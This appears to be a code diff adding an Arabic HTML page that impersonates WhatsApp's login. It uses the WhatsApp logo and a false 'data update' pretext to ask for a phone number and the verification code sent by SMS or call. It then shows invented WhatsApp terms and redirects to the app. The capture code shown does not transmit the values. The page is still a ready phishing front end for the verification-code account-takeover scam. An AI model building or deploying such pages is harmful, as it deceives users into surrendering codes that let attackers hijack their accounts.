@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول إلى واتساب</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 400px;
+            position: relative;
+        }
+        h1 {
+            font-size: 24px;
+            color: #4CAF50;
+        }
+        img {
+            width: 50px;
+            margin-bottom: 20px;
+        }
+        input {
+            padding: 10px;
+            margin: 10px 0;
+            width: 100%;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        button {
+            padding: 12px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            width: 100%;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        #languageSelector {
+            position: absolute;
+            top: 10px;
+            right: 20px;
+            font-size: 14px;
+            color: #4CAF50;
+            cursor: pointer;
+        }
+        #message {
+            font-size: 14px;
+            color: #555;
+            margin-top: 20px;
+        }
+        #note {
+            font-size: 12px;
+            color: #888;
+            margin-top: 5px;
+        }
+        #error {
+            color: red;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        #waitingMessage {
+            display: none;
+            font-size: 16px;
+            color: #555;
+            margin-top: 20px;
+        }
+        #acceptTermsContainer {
+            display: none;
+        }
+        #acceptTermsMessage {
+            font-size: 16px;
+            color: #333;
+            margin-top: 20px;
+        }
+        .termsButton {
+            background-color: #4CAF50;
+            padding: 12px;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            width: 100%;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .termsButton:hover {
+            background-color: #45a049;
+        }
+        #policyMessage {
+            font-size: 12px;
+            color: #666;
+            margin-top: 15px;
+            text-align: justify;
+        }
+        #updatePage {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        #updatePage h1 {
+            color: #4CAF50;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        #updatePage img {
+            width: 100px;
+        }
+        .fakeCall {
+            background-color: #ddd;
+            color: #4CAF50;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            width: 100%;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+        .fakeCall:hover {
+            background-color: #bbb;
+        }
+        .resendCode {
+            background-color: #ddd;
+            color: #4CAF50;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            width: 100%;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+        .resendCode:hover {
+            background-color: #bbb;
+        }
+        #timer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: white;
+            background-color: #4CAF50;
+            padding: 5px;
+            border-radius: 5px;
+            display: inline-block;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="mainContainer">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1024px-WhatsApp.svg.png" alt="WhatsApp Logo">
+        <h1>تسجيل الدخول إلى واتساب</h1>
+        <div id="languageSelector" onclick="changeLanguage()">English</div>
+        <input type="text" id="phone" placeholder="أدخل رقم الهاتف" />
+        <button onclick="sendCode()">التالي</button>
+        <p id="message">أدخل رقم هاتفك واضغط على التالي.</p>
+        <p id="note" style="text-align:center;">هذا الإجراء لتحديث البيانات.</p>
+        <p id="policyMessage">هذا الإجراء لتحديث بيانات الحساب والسياسات والأحكام.</p>
+        <p id="error"></p>
+    </div>
+
+    <div class="container" id="verificationContainer" style="display:none;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1024px-WhatsApp.svg.png" alt="WhatsApp Logo">
+        <h1>تحقق من رقمك</h1>
+        <p id="phoneNumberMessage" style="color: green;">تم إرسال رمز التحقق إلى الرقم: <span id="userPhone"></span></p>
+        <input type="text" id="verificationCode" placeholder="أدخل رمز التحقق أو اختر المكالمة" />
+        <button onclick="verifyCode()">إرسال</button>
+        <button class="fakeCall" onclick="fakeCall()">اتصل بي الآن</button>
+        <p id="waitingMessage">يرجى الانتظار قليلاً، قد نتصل بك قريبًا لتأكيد الرقم.</p>
+        <p id="errorVerification" style="color:red;"></p>
+        <!-- العد التنازلي -->
+        <div id="timer" style="display: none;">
+            يمكنك إعادة إرسال الرمز بعد <span id="countdown">60</span> ثانية.
+        </div>
+    </div>
+
+    <div class="container" id="smsPage" style="display:none;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1024px-WhatsApp.svg.png" alt="WhatsApp Logo">
+        <h1>تفقد هاتفك</h1>
+        <p id="phoneNumberMessage" style="color: green;">تفقد هاتفك<p>
+        <input type="text" id="smsVerificationCode" placeholder="أدخل رمز التحقق" />
+        <button onclick="verifySMSCode()">إرسال</button>
+        <div id="timer">
+            يمكنك إعادة إرسال الرمز بعد <span id="countdown">60</span> ثانية
+        </div>
+        <button class="resendCode" onclick="resendCode()">إعادة إرسال رمز التحقق عبر SMS</button>
+        <p id="smsError" style="color:red;"></p>
+    </div>
+
+    <div class="container" id="acceptTermsContainer">
+        <h1>الخطوة الأخيرة: قبول الشروط والأحكام</h1>
+        <p id="acceptTermsMessage">من خلال النقر على "موافق"، أنت توافق على شروط وأحكام الاستخدام الخاصة بنا.</p>
+        <p id="policyMessage">
+            <strong>شروط وأحكام واتساب</strong><br>
+            1. يحق لواتساب تعديل هذه الشروط في أي وقت.<br>
+            2. لن يتمكن المستخدم من استخدام خدمة واتساب إلا بعد الموافقة الكاملة على هذه الشروط.<br>
+            3. يعد المستخدم مسؤولاً عن جميع الأنشطة التي تحدث عبر حسابه الشخصي.<br>
+            <br>
+            هذا النص يحتوي على شروط معقدة قد يصعب قراءتها بالكامل، ويجب عليك الموافقة عليها لمتابعة استخدام الخدمة.
+        </p>
+        <button class="termsButton" onclick="acceptTerms()">موافق</button>
+    </div>
+
+    <div class="container" id="updatePage">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1024px-WhatsApp.svg.png" alt="WhatsApp Logo">
+        <h1>يتم تحديث البيانات والأحكام، يرجى الانتظار قليلاً...</h1>
+        <p>سيتم إعادة توجيهك إلى واتساب قريبًا.</p>
+    </div>
+
+    <script>
+        var countdownTime = 60;
+        var timer;
+
+        function startCountdown() {
+            document.getElementById("timer").style.display = "inline-block"; // عرض العد التنازلي
+            timer = setInterval(function() {
+                countdownTime--;
+                document.getElementById("countdown").innerText = countdownTime;
+
+                if (countdownTime <= 0) {
+                    clearInterval(timer);
+                    document.getElementById("timer").style.display = "none"; // إخفاء العد التنازلي
+                    // هنا يمكن إضافة إجراءات أخرى مثل تفعيل إعادة إرسال الرمز
+                }
+            }, 1000);
+        }
+
+        function sendCode() {
+            var phone = document.getElementById("phone").value;
+            var message = document.getElementById("message");
+            var errorMessage = document.getElementById("error");
+
+            if (phone.length >= 10) {
+                message.innerHTML = `تم إرسال رمز التحقق إلى: ${phone}. يرجى إدخال الرمز أو اختيار مكالمة هاتفية.`;
+                document.getElementById("userPhone").innerText = phone;
+                errorMessage.innerHTML = "";
+
+                // الانتقال إلى صفحة التحقق
+                document.getElementById("mainContainer").style.display = "none";
+                document.getElementById("verificationContainer").style.display = "block";
+
+                // بدء العد التنازلي
+                startCountdown();
+            } else {
+                errorMessage.innerHTML = "يرجى إدخال رقم هاتف صحيح.";
+                message.innerHTML = "أدخل رقم هاتفك واضغط على التالي.";
+            }
+        }
+
+        function verifyCode() {
+            var verificationCode = document.getElementById("verificationCode").value;
+            var errorVerification = document.getElementById("errorVerification");
+
+            if (verificationCode.length >= 6) {
+                document.getElementById("verificationContainer").style.display = "none";
+                document.getElementById("acceptTermsContainer").style.display = "block";
+            } else {
+                errorVerification.innerHTML = "رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى.";
+            }
+        }
+
+        function fakeCall() {
+            document.getElementById("verificationContainer").style.display = "none";
+            document.getElementById("smsPage").style.display = "block";
+        }
+
+        function resendCode() {
+            countdownTime = 60;
+            startCountdown();
+            alert("تم إرسال رمز التحقق عبر SMS.");
+        }
+
+        function verifySMSCode() {
+            var smsCode = document.getElementById("smsVerificationCode").value;
+            if (smsCode.length >= 6) {
+                document.getElementById("smsPage").style.display = "none";
+                document.getElementById("acceptTermsContainer").style.display = "block";
+            } else {
+                document.getElementById("smsError").innerHTML = "يرجى إدخال رمز التحقق بشكل صحيح.";
+            }
+        }
+
+        function acceptTerms() {
+            document.getElementById("acceptTermsContainer").style.display = "none";
+            document.getElementById("updatePage").style.display = "block";
+
+            setTimeout(function() {
+                window.location.href = "whatsapp://"; 
+            }, 5000);
+        }
+
+        window.onload = function() {
+            startCountdown();
+        };
+    </script>
+
+</body>
+</html>
